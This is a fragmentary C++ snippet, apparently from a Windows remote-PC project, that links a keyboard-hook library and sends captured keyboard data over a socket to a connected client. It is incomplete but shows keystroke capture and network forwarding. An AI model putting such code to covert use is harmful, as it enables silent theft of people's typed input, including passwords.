...
#ifdef _DEBUG
#pragma comment(lib,"..\\..\\..\\RemotePCS\\Debug\\KeyBoardHOOK.lib")
#else
#pragma comment(lib,"..\\..\\..\\RemotePCS\\Release\\KeyBoardHOOK.lib")
#endif
...
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   ...
   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, 200, 240, NULL, NULL, hInstance, NULL);
...
//						PH.type = eKeyboard;
						...
						PH.length = data->dwData;
						memcpy(buf, data->lpData, data->dwData);
						send(client, (char*)&PH, sizeof(PH), 0);
